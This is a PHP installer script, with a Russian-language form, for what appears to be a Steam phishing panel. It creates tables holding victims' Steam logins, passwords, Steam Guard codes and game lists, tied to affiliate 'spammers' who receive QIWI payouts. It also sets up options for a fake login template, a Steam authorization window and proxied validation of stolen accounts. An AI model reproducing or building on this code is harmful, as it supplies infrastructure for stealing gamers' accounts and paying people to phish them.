<?php
require_once($_SERVER['DOCUMENT_ROOT']."/php/classDB.php");

	ini_set('log_errors', 'On');
	ini_set('error_log', $_SERVER['DOCUMENT_ROOT']."/php_errors.log");

	if (isset($_REQUEST["do"])) {
		
		$config = new AdmConfig();
		
		$config->db_host = $_REQUEST["db_host"];
		$config->db_userName = $_REQUEST["db_username"];
		$config->db_userPass = $_REQUEST["db_userpass"];
		$config->db_dbName = NULL;
		
		$db = new DB();
		if (!$db->CheckDBIsExist($_REQUEST["db_name"])) {
			$db->CreateDB($_REQUEST["db_name"]);
		}
		
		$config->db_dbName = $_REQUEST["db_name"];
		
		unset($db);
		$db = new DB();
		
		$db->CreateTable
		(
			"accounts",
			array
			(
				"`id` int(11) NOT NULL PRIMARY KEY AUTO_INCREMENT",
				"`login` varchar(255) NOT NULL",
				"`password` varchar(255) NOT NULL",
				"`guard` varchar(10) NOT NULL",
				"`steamid` varchar(255) NOT NULL",
				"`kt` varchar(255) NOT NULL",
				"`time` int(10) NOT NULL",
				"`status` int(1) NOT NULL",
				"`spammer` varchar(255) DEFAULT NULL",
				"`games` text NOT NULL",
				"`isnotificated` int(1) NOT NULL DEFAULT '0'"
			)
		);
		
		$db->CreateTable
		(
			"settings",
			array
			(
				"`id` int(10) UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT",
				"`name` varchar(255) NOT NULL",
				"`normalName` varchar(255) NOT NULL",
				"`value` text NOT NULL"
			)
		);
		
		$settings_arr = array (
			array('admin_login', 'Логин администратора', $_POST["adm_username"]),
			array('admin_password', 'Пароль администратора', $_POST["adm_userpass"]),
			array('title', 'Описание сайта', 'Best gaming website'),
			array('login_link', 'Ссылка на авторизацию', '/openid/login/?openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.identity'),
			array('visits', 'Количество посещений', '0'),
			array('default_comment', 'Стандартный коментарий', 'Выплата Ферсоне'),
			array('default_sum', 'Стандартная сумма выплаты', '50'),
			array('timer_activity', 'Таймер', '0'),
			array('timer_date', 'Дата окончания таймера', $_REQUEST["timer_date"]),
			array('pass_prefix', 'Префикс к паролю', ''),
			array('wnd_type', 'Авторизация Steam', '1'),
			array('validate_activity', 'Валидация через Steam', '0'),
			array('proxy_activity', 'Включена работа через прокси при валидации через Steam?', '0'),
			array('proxy', 'Прокси (IP:PORT)', ''),
			array('fake_template', 'Шаблон фейка', '1')
		);
		
		foreach ($settings_arr as $key => $setting) {
			$db->addRow(
				"settings", 
				array
				(
					array("name", "=", $setting[0]),
					array("normalName", "=", $setting[1]),
					array("value", "=", $setting[2])
				)
			);
		}
		
		
		
		$db->CreateTable
		(
			"spammers",
			array
			(
				"`id` int(10) UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT",
				"`login` varchar(255) NOT NULL",
				"`password` varchar(255) NOT NULL",
				"`balance` float NOT NULL",
				"`qiwi` varchar(255) NOT NULL"
			)
		);
		
		$db->CreateTable
		(
			"payouts",
			array
			(
				"`id` int(10) UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT",
				"`login` varchar(255) NOT NULL",
				"`sum` double UNSIGNED NOT NULL",
				"`state` int(1) UNSIGNED NOT NULL"
			)
		);
		
		
		// file_put_contents("installed", "");
		header("Location: /apanel/auth"); 
		exit();
	}
?>

<!doctype xhtml>
<html>
	<head>
		<title>Установка скрипта</title>
		<link href="https://img.icons8.com/ios/50/000000/settings.png" rel="icon" sizes="16x16" type="image/png">
		<link rel="stylesheet" href="assets/css/install.css" />
<script src="assets/js/install.js"></script>
	</head>
	
	<body >
<div class="login-page">
  <div class="form">
    <form class="login-form" method="post">
    <input type="text" name="db_host" id="db_host" class="text-field-narrow" placeholder="Хост" value="localhost">
	<input type="text" name="db_name" id="db_name" class="text-field-narrow" placeholder="Название базы данных" value="">
	<input type="text" name="db_username" id="db_username" class="text-field-narrow" placeholder="Имя пользователя базы данных" value="">
	<input type="text" name="db_userpass" id="db_userpass" class="text-field-narrow" placeholder="Пароль пользователя базы данных" value="">
	<input type="text" name="adm_username" id="adm_username" class="text-field-narrow" placeholder="Логин администратора" value="">
	<input type="password" name="adm_userpass" id="adm_userpass" class="text-field-narrow" placeholder="Пароль администратора" value="">
	<input type="text" name="timer_date" id="timer_date" class="text-field-narrow" placeholder="Дата окончания таймера" value="">
      <button id="installButton" type="submit" name="do">Установить</button>
    </form>
  </div>
</div>
		
	</body>
</html>